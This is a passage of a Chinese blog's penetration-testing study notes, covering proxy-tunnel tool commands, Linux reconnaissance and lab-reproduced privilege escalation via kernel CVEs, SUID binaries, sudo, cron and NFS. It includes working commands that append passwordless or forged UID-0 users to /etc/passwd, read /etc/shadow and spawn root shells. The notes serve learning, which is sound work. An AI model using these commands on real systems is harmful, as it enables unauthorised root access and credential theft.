代理通道</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143228545.png" alt="image-20210917143228545"></p><blockquote><p>可以使用 stopsocks 停止</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917142735471.png" alt="image-20210917142735471"></p><blockquote><p>一级代理的搭建就是这么简单</p></blockquote><h3 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a>多级代理</h3><blockquote><p>现在一级代理搭建好后，可以直接准备二级代理、</p></blockquote><p>使用 admin 在相应的节点建立监听</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152142891.png" alt="image-20210917152142891"></p><p>然后在内网主机执行连接操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152234610.png" alt="image-20210917152234610"></p><p>之后就会连接成功了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152258505.png" alt="image-20210917152258505"></p><blockquote><p>这里使用 connect 命令连接不上，具体原因暂时不清楚</p><p>操作步骤：内网靶机设置监听  -l  ；admin 执行 connect 操作连接主机响应端口</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152624930.png" alt="image-20210917152624930"></p><blockquote><p>工具基础操作其实也并不难，就是体积有点大，多级代理的操作就类似</p></blockquote><h3 id="命令解释"><a href="#命令解释" class="headerlink" title="命令解释"></a>命令解释</h3><ul><li><p>命令 agent 监听某个端口并等待子节点的接入：<code>listen</code></p><blockquote><ol><li><code>Normal passive</code>：agent 将会以普通的方式监听目标端口，并等待子节点接入</li><li><code>IPTables Reuse</code>：agetnt 将以 IPTable Reuse 的方式复用端口，并等待子节点接入</li><li><code>SOReuse</code>：agent 将会以 SOReuse 的方式复用端口，并等待子节点接入</li></ol><p><code>listen</code>  一次只能接受一个子节点，若需要多个子节点连入，需要多次执行</p></blockquote></li><li><p>使用 ssh 连接目标机器：<code>ssh ip:port</code></p></li><li><p>获取当前节点的 shll：<code>shell</code></p></li><li><p>在当前节点启动 socks5 服务：<code>socks port</code></p></li><li><p>停止 socks5 服务：<code>stopsocks</code></p></li><li><p>命令当前节点连接另一个子节点：<code>connect ip:port </code></p><blockquote><p>具体使用参照上面的多级代理</p></blockquote></li><li><p>命令当前节点以 ssh 隧道的方法连接另一个子节点：<code>sshtunnel ip:22 port</code></p><blockquote><p>具体使用和 connect 类似</p></blockquote></li><li><p>上传文件，选择好相应节点  <code>upload filename </code></p></li><li><p>下载文件，选择好相应节点 <code>download filename</code></p></li><li><p>返回到主 panel：<code>back</code></p></li><li><p>映射 admin 上的端口到远程端口：<code>forward 9000 127.0.0.1:22</code></p></li><li><p>关闭当前节点的远程映射：<code>stopforward</code></p></li><li><p>反向映射当前端 agent 端口到 admin 的本地端口： <code>backward 9001 22</code></p></li><li><p>关闭当前节点的反向映射：<code>stopbackward</code></p></li><li><p>命令当前节点下线：<code>shutdown</code></p></li></ul><h2 id="其他工具搭建隧道"><a href="#其他工具搭建隧道" class="headerlink" title="其他工具搭建隧道"></a>其他工具搭建隧道</h2><p><a href="https://v0w.top/2020/08/11/IntranetProxy/">https://v0w.top/2020/08/11/IntranetProxy/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透知识点</title>
    <link href="/2021/10/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2021/10/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="知识点梳理-amp-复现"><a href="#知识点梳理-amp-复现" class="headerlink" title="知识点梳理 &amp; 复现"></a>知识点梳理 &amp; 复现</h1><blockquote><p>要求：写清楚各个知识点，环境搭建，漏洞复现，使用的工具等</p></blockquote><h2 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">ls</span> <span class="hljs-string">列举当前目录内容</span><br><span class="hljs-attr">ls</span> <span class="hljs-string">-al 查看当前目录下所有文件（包括隐藏文件），并且显示文件详细信息（修改时间，权限等）</span><br><br><span class="hljs-attr">find</span> <span class="hljs-string">查找文件（根据文件的属性进行查找）</span><br><span class="hljs-attr">find</span> <span class="hljs-string">/ -name demon.txt 在根目录下查找该文件</span><br><span class="hljs-attr">grep</span> <span class="hljs-string">查找文件（根据文件的内容进行查找），可以搭配正则表达式使用</span><br><span class="hljs-attr">which</span> <span class="hljs-string">在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个结果</span><br><br><span class="hljs-attr">cat</span> <span class="hljs-string">输出文件内容</span><br><span class="hljs-attr">cat</span> <span class="hljs-string">-n 显示内容的同时打印出行号</span><br><span class="hljs-attr">tac</span> <span class="hljs-string">与cat相反，从最后一行打印文件内容</span><br><span class="hljs-attr">nl</span> <span class="hljs-string">显示文件内容并且打印行号</span><br><span class="hljs-attr">head</span> <span class="hljs-string">查看文件前几行</span><br><span class="hljs-attr">head</span> <span class="hljs-string">-n number filename.txt 显示文件的先number行</span><br><span class="hljs-attr">tail</span> <span class="hljs-string">显示文件结尾几行（与head相反，用法相似）</span><br><span class="hljs-attr">more</span> <span class="hljs-string">对于比较长的文件内容会分页显示</span><br><span class="hljs-attr">less</span> <span class="hljs-string">自由上下翻页查看文件内容</span><br><br><span class="hljs-attr">touch</span> <span class="hljs-string">创建文件</span><br><span class="hljs-attr">rm</span> <span class="hljs-string">删除文件</span><br><span class="hljs-attr">rm</span> <span class="hljs-string">-f 强制删除文件</span><br><span class="hljs-attr">rm</span> <span class="hljs-string">-r 递归删除目录</span><br><span class="hljs-attr">mkdir</span> <span class="hljs-string">创建目录</span><br><span class="hljs-attr">rmdir</span> <span class="hljs-string">删除目录</span><br><br><span class="hljs-attr">cp</span> <span class="hljs-string">filename path/filename 复制文件</span><br><span class="hljs-attr">mv</span> <span class="hljs-string">filename path/filename 移动文件</span><br><br><span class="hljs-attr">pwd</span> <span class="hljs-string">显示当前位置</span><br><span class="hljs-attr">cd</span> <span class="hljs-string">切换文件路劲</span><br><br><span class="hljs-meta">vim/vi</span>  <span class="hljs-string">文件编辑</span><br><br><span class="hljs-meta">文件权限：r</span> <span class="hljs-string">可读 4   w 可写 2   x 可执行  1</span><br><span class="hljs-attr">rwx</span> = <span class="hljs-string">4+2+1 =7</span><br><span class="hljs-meta">drwxr-xr-x</span> <span class="hljs-string">1 kali kali  4096 Jul 19 15:36 1</span><br><span class="hljs-meta">-rw-r--r--</span> <span class="hljs-string">1 kali kali     0 Jul 19 15:36 2</span><br><span class="hljs-meta">第一位：d代表文件夹</span> <span class="hljs-string">-代表文件</span><br><span class="hljs-attr">第一段：代表拥有者的权限</span><br><span class="hljs-attr">第二段：拥有者所在组的组员权限</span><br><span class="hljs-attr">第三段：其他用户的权限</span><br><span class="hljs-meta">*</span> <span class="hljs-string">三位为一段</span><br><span class="hljs-attr">chmod</span> <span class="hljs-string">更改文件权限</span><br><span class="hljs-attr">chmod</span> <span class="hljs-string">777 file 设置文件所有人都可以读写</span><br><span class="hljs-attr">chown</span> <span class="hljs-string">修改文件拥有者权限（一般只有root用户有这个操作权限）</span><br><br><span class="hljs-attr">tar</span> <span class="hljs-string">打包并压缩文件</span><br><span class="hljs-attr">tar</span> <span class="hljs-string">-zcvf filename.tar demon.txt 压缩文件</span><br>    <span class="hljs-attr">tar</span> <span class="hljs-string">-zxvf filename.tar 解压文件</span><br></code></pre></td></tr></table></figure><h5 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">ps</span> <span class="hljs-string">显示系统运行进程</span><br><span class="hljs-attr">pstree</span> <span class="hljs-string">显示进程树</span><br><span class="hljs-attr">pstree</span> <span class="hljs-string">-aup 显示当前系统的进程树</span><br><span class="hljs-attr">top</span> <span class="hljs-string">默认按照cup的占用情况，显示进程</span><br><span class="hljs-attr">kill</span> <span class="hljs-string">终止进程 kill -l PID</span><br><span class="hljs-attr">killall</span> <span class="hljs-string">杀死同一进程组内的所有进程 killall taskname</span><br></code></pre></td></tr></table></figure><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">重定向符 &gt;<br>管道符  <span class="hljs-string">|</span><br></code></pre></td></tr></table></figure><blockquote><p>目前只记得这些，后期再继续更新</p></blockquote><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">重要：<br>ipconfig 查看IP地址<br>netstat -ano 查看端口信息<br>whoami 当前用户（查询当前用户权限）<br>id 当前用户的权限和所在的管理组<br>uname -a 查看内核版本（方便后期利用内核漏洞提权）<br>ps/top 当前进程<br>cat <span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/cgroup 判断是否是docker容器<br>原理：容器是通过cgroup来实现资源限制，判断容器是否在一个cgroup组中<br>显示结果很长的就基本可以判断为docker<br><br>主要：<br><span class="hljs-regexp">/etc/</span>network/interfaces 查看网卡配置<br>cat <span class="hljs-regexp">/proc/</span>version 查看内核信息<br>cat <span class="hljs-regexp">/etc/</span>*release 查看linux发行信息<br>hostname 打印主机名<br>iptables -L 查看防火墙配置（需要root）<br>cat <span class="hljs-regexp">/etc/</span>apache2/apache2.conf apache配置文件<br>cat <span class="hljs-regexp">/etc/my</span>.conf  mysql配置文件<br>cat <span class="hljs-regexp">/etc/</span>shadow 查看账户密码信息（root权限）<br>cat <span class="hljs-regexp">/etc/</span>passwd 查看用户信息<br>cat <span class="hljs-regexp">/etc/g</span>roup 查看用户组信息<br>查看.bash_history文件 查看指令历史记录<br>查看.mysql_history文件 查看mysql操作记录<br>查看系统日志：<span class="hljs-regexp">/var/</span>log<br>查看登录日志：w  who lastlog<br><br>次要：<br>dpkg -l 查看安装的软件包<br>crontab -l 查看是否有计划任务<br>cat <span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>  开机启动项<br>cat <span class="hljs-regexp">/etc/</span>shells  查看可以用shell<br>env  打印系统环境信息<br>cat <span class="hljs-regexp">/proc/</span>cpuinfo  查看cpu信息<br>* /proc 目录很重要，需要注意<br></code></pre></td></tr></table></figure><blockquote><p>感觉Linux的内网渗透比较少见，收集的信息也相比于windows要少一些</p></blockquote><h4 id="提权手法"><a href="#提权手法" class="headerlink" title="提权手法"></a>提权手法</h4><h5 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h5><blockquote><p>提权原理偏向于Linux内核，没接触过这个方向，看来一下网上文章，不太能看懂。</p><p><a href="https://www.cnblogs.com/R4v3n/articles/9227723.html">https://www.cnblogs.com/R4v3n/articles/9227723.html</a></p></blockquote><p>先收集内核版本信息，然后直接利用工具提权（当个脚本小子挺好的），这几个工具利用起来感觉效果不好。</p><ol><li><code>searchsploit</code></li><li><a href="https://github.com/mzet-/linux-exploit-suggester%EF%BC%88%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%87%B4%E6%A3%80%E6%B5%8B%E4%B8%80%E4%BA%9BLinux%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%89">https://github.com/mzet-/linux-exploit-suggester（这个工具可以大致检测一些Linux可能存在的漏洞）</a></li><li><a href="https://github.com/jondonas/linux-exploit-suggester-2%EF%BC%88%E4%BD%BF%E7%94%A8%E7%9A%84perl%E8%AF%AD%E8%A8%80%EF%BC%8C%E4%B8%8D%E4%B8%80%E5%AE%9A%E6%AF%8F%E4%B8%AA%E4%B8%BB%E6%9C%BA%E9%83%BD%E8%83%BD%E6%89%A7%E8%A1%8C%EF%BC%89">https://github.com/jondonas/linux-exploit-suggester-2（使用的perl语言，不一定每个主机都能执行）</a></li></ol><blockquote><p>内核提权一般是作为最后选项，因为exp执行后远程主机可能会崩溃，许多公开可用的提权漏洞并不是很稳定，目标主机也可能在你得到root权限后直接崩溃，并且漏洞利用可能会留下导致被捕获的痕迹/日志。</p></blockquote><h6 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p>漏洞环境：ubuntu16.04    Linux Kernel 4.15</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720103606519.png" alt="image-20210720103606519"></p><p>首先使用工具检测一下可能存在的提权漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720103951085.png" alt="image-20210720103951085"></p><p><strong>CVE-2019-13272</strong>（该漏洞利用前提:需要目标服务器有桌面环境）</p><p><a href="https://0x20h.com/p/fe4f#pkexec">https://0x20h.com/p/fe4f#pkexec</a></p><p>漏洞影响版本：Linux Kernel &lt; 5.1.17</p><p>…………上面工具没有检测出这个漏洞，这里尝试直接利用这个漏洞</p><p><a href="https://github.com/bcoles/kernel-exploits">https://github.com/bcoles/kernel-exploits</a> 下载EXP</p><p>编译c文件，并且需要赋予可执行权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720104648771.png" alt="image-20210720104648771"></p><p>直接执行，获取到root权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720104735795.png" alt="image-20210720104735795"></p><blockquote><p>这个复现过程很简单，但是原理很难，这个CVE由于需要目标主机是桌面版所以平时的用处不大。</p></blockquote><p><strong>CVE-2021-33909</strong></p><p>影响范围：Linux kernel 3.16 - 5.13.x</p><blockquote><p>暂无EXP，提权范围挺广的</p></blockquote><h5 id="利用SUID提权"><a href="#利用SUID提权" class="headerlink" title="利用SUID提权"></a>利用SUID提权</h5><p>参考文章：</p><p><a href="https://jlkl.github.io/2020/01/27/Web_15/">https://jlkl.github.io/2020/01/27/Web_15/</a></p><p>SUID是一种特殊的权限，可以让调用者在执行的过程中暂时获得该文件的拥有者的权限。如果找到root用户拥有的SUID文件并运行，就可以暂时获取到root用户的权限</p><p>查找具有SUID权限位并且属与root的文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;<br>………<br></code></pre></td></tr></table></figure><p>常见可以用来提权的命令</p><ol><li><code>nmap</code></li><li><code>find</code></li><li><code>vim</code></li><li><code>bash</code></li><li><code>nano</code></li><li><code>cp/mv</code></li><li><code>more/less</code></li><li><code>awk</code></li><li><code>apt</code></li><li>…………</li></ol><p><strong>namp提权</strong></p><p> 在<code>nmap 5.20</code>以前存在<code>interactive</code>交互模式，可以利用这个交互模式提权</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">nmap</span> <span class="hljs-string">--interactive</span><br><span class="hljs-comment">!sh</span><br></code></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p>P神里面对新的<code>nmap</code>提权做了深入的解释，简单写一下我的理解</p><p>SUID提权主要还是灵活利用了对于普通用户当前运行命令时的<code>Effective UID</code>，只有这个程序的所有者是0号或其他super user，同时拥有<code>suid</code>权限，才可以提权。<code>nmap</code>具有了<code>suid</code>时和其他命令具有<code>suid</code>是有区别的。</p><p>新版的<code>nmap</code>没有了<code>interactive</code>交互模式，并且随着Linux新版本的更新研究人员也对<code>suid</code>提权做了限制。这里采用了新的方法来使用<code>nmap</code>提权，添加用户</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">local file = io.open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>file:write(<span class="hljs-string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)<br>file:close()<br></code></pre></td></tr></table></figure><p>为<code>nmap</code>赋予<code>root</code>用户的<code>suid</code>权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720170143300.png" alt="image-20210720170143300"></p><p>执行上面的脚本，成功添加了一个root用户，直接切换用户获取到权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720170302762.png" alt="image-20210720170302762"></p><p><strong>find提权</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720140111241.png" alt="image-20210720140111241"></p><p>查询到<code>find</code> 具有<code>suid</code>权限，进行<code>find</code>提权</p><p>先创建一个文件，中途借用这个文件来执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720140532708.png" alt="image-20210720140532708"></p><p>成功提升了权限</p><p><strong>bash</strong></p><p><code>bash -p</code> 开启一个新的shell，如果是suid的话就是获取到root的shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720142200911.png" alt="image-20210720142200911"></p><p>执行命令获取权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720142318447.png" alt="image-20210720142318447"></p><p><strong>cp / mv</strong></p><p>覆盖<code>/etc/shadow</code> 或者 <code>/etc/passwd</code></p><blockquote><p>需要小心一点，命令不要弄错了不然容易改崩用户</p></blockquote><p>查看具有SUID权限的命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152342842.png" alt="image-20210720152342842"></p><p>伪造用户</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /etc/passwd &gt; passwd  将文件复制出来<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>openssl passwd <span class="hljs-number">-1</span> -salt hack hack123  伪造密码<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; passwd 密码写入复制文件<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cp passwd /etc/passwd  修改正常的passwd文件<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>su - hack 填入密码即可<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152752202.png" alt="image-20210720152752202"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152821108.png" alt="image-20210720152821108"></p><p><code>mv</code>同理类似</p><p><strong>vim vi nano等编辑器</strong></p><p>可以直接选择写入一个<code>root</code>权限用户，不用网上那种花里胡哨的方法，网上的搞了半天也没有成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720173740391.png" alt="image-20210720173740391"></p><p><strong>less/more</strong></p><blockquote><p>暂时没有成功获得权限</p></blockquote><p><strong>awk</strong></p><p><code>awk</code>是一种处理文件的语言，是文本分析工具</p><p> 提权命令：<code>awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code></p><blockquote><p>环境没有搭建好，暂时没有成功</p></blockquote><p><strong>总结</strong></p><p>个人感觉<code>suid</code>提权，主要是网站管理人员的疏忽，使用这个方法只能看运气，平时多积累一点各种命令提权的方法</p><h5 id="SUDO提权"><a href="#SUDO提权" class="headerlink" title="SUDO提权"></a>SUDO提权</h5><ol><li><p><code>sudo</code>无密码，可以查看<code>/etc/sudoers</code>或者使用<code>sudo -l</code>来查看</p><blockquote><p>经过多次练习，发现sudo提权还是很有用的</p></blockquote><p>案例</p><p><code>sudo -l</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142203251.png" alt="image-20210818142203251"></p><p>执行命令<code>sudo apt changelog apt</code>提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142004907.png" alt="image-20210818142004907"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142230467.png" alt="image-20210818142230467"></p></li><li><p>CVE-2021-3156</p><p>漏洞原因：当<code>sudo</code>通过<code>-s</code>或者<code>-i</code>命令行选项在shell模式下运行命令是，它会把命令参数中使用反斜杠转义特殊字符，但是使用<code>-s</code>或者<code>-i</code>标志运行sudoedit时，实际上并没有进行转义，从而导致了缓冲区溢出漏洞，只要存在sudoers文（/etc/sudoers），就可以提权了。</p><p>影响版本：<code>sudo 1.8.2-1.8.31p2   1.9.0-1.9.5p1</code></p><p>漏洞检测：<code>sudo --verison</code> 查看版本</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721095440738.png" alt="image-20210721095440738"></p><p>利用exp来提权：<a href="https://github.com/blasty/CVE-2021-3156%EF%BC%8C%E6%B2%A1%E6%9C%89%E5%8F%91%E7%8E%B0%E9%80%82%E5%90%88ubuntu16.04%E7%89%88%E6%9C%AC%E7%B3%BB%E7%BB%9F%E7%9A%84exp%EF%BC%8C%E6%89%80%E4%BB%A5%E4%BD%BF%E7%94%A818.04%E7%89%88%E6%9C%AC%E6%9D%A5%E6%B5%8B%E8%AF%95%E3%80%82">https://github.com/blasty/CVE-2021-3156，没有发现适合ubuntu16.04版本系统的exp，所以使用18.04版本来测试。</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721102908854.png" alt="image-20210721102908854"></p><p>先make，然后执行文件，选择相应的系统即可（这里提供的选择比较少，也没有找到其他合适的exp）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721104615754.png" alt="image-20210721104615754"></p></li></ol><blockquote><p><del>感觉SUDO提权没有SUID提权舒服</del></p></blockquote><h5 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h5><p>crontab命令用来定期执行程序</p><p>语法格式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">-e   编辑当前的crontab文件，默认保存在<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>用户名下<br>-r   删除目前的时程表<br>-l   列出目前的时程表<br><br><br>分 时 日 月 周 需要执行的命令<br><br>分：<span class="hljs-number">0</span>~<span class="hljs-number">59</span><br>时：<span class="hljs-number">0</span>~<span class="hljs-number">23</span><br>日：<span class="hljs-number">1</span>~<span class="hljs-number">31</span><br>月：<span class="hljs-number">1</span>~<span class="hljs-number">12</span><br>周：<span class="hljs-number">0</span>~<span class="hljs-number">6</span> <span class="hljs-comment">#0代表周日</span><br>*：（星号）代表取值范围中的每一个数字<br>-：（减号）连续区间表达式，想要代表<span class="hljs-number">1</span>~<span class="hljs-number">7</span>，则需要写成<span class="hljs-number">1</span>-<span class="hljs-number">7</span><br><span class="hljs-regexp">/：（斜杠）表示每x个。例如想在每10分钟执行一次，则在分的位置写：*/</span><span class="hljs-number">10</span><br>,：（逗号）表示多个取值。如果想在<span class="hljs-number">1</span>点，<span class="hljs-number">3</span>点，<span class="hljs-number">5</span>点执行一次，则在时的位置写：<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span><br><br>*<span class="hljs-regexp">/2 * * * * echo `date` &gt;&gt; /</span>tmp/stu01<br>表示每两分钟输出时间到<span class="hljs-regexp">/tmp/</span>stu01文件<br><br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/u</span>ser 用来区分每个用户自己的执行计划<br><span class="hljs-regexp">/etc/</span>crontab 表示系统执行计划，需要在五个*后面加上用户<br>*<span class="hljs-regexp">/1 * * * * root  ls /</span>&gt;&gt; <span class="hljs-regexp">/tmp/</span>cron<br><span class="hljs-regexp">/etc/</span>cron.deny   表示只拒绝哪些用户不能他用crontab，默认存在空文件<br><span class="hljs-regexp">/etc/</span>cron.allow  表示只允许哪些用户使用crontab<br><br>查看定时任务：cat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure><p>原理就是通过修改root用户的定时任务的内容来提权</p><ol><li><p>root权限的定时任务脚本普通用户可写</p><ul><li>root权限执行的定时任务或者其所在的文件夹，地权限用户拥有写权限，则可以进行提权</li></ul><p>首先以root用户的身份创建了一个定时任务，每分钟向文件中写入字符串</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721112724742.png" alt="image-20210721112724742"></p><blockquote><p> 本地测试时后默认的<code>/var/spool/cron/crontabs</code>普通用户没有可读权限</p></blockquote><p>这里使用普通用户修改root用户的定时脚本</p><p>修改定时任务内容提权的方法就有很多了，可以直接添加用户，反弹shell，…………</p></li><li><p>root权限的定时任务调用的脚本普通用户可写</p><ul><li>定时任务可能并不是孤立存在的，他会调用很多别的shell脚本来完成操作，root权限定时任务调用的脚本也是以root权限执行的</li></ul><p>这个的大致过程和上面的一样</p></li></ol><blockquote><p>对于计划任务提权的方法，需要有对一些文件的可写可读权限，限制还是比较大的，不是特别方便。</p></blockquote><h5 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h5><p>NFS（网络文件系统），是一个客户端/服务端应用程序，是一个共享目录。</p><p>执行<code>cat /etc/exports</code> 如果有<code>no_root_squash</code>字样，就说明root用户对共享目录有很高的权限控制，就像在本地一样，我们在获得一台机器的root权限后就可以通过nfs在另一台低权限机器上实现提权。</p><p>提权的过程就是利用高权限主机在共享目录中创建复制一个bash，然后再赋予suid权限，这样就可以提权了</p><blockquote><p>平时遇到情况不多</p></blockquote><h5 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h5><p><a 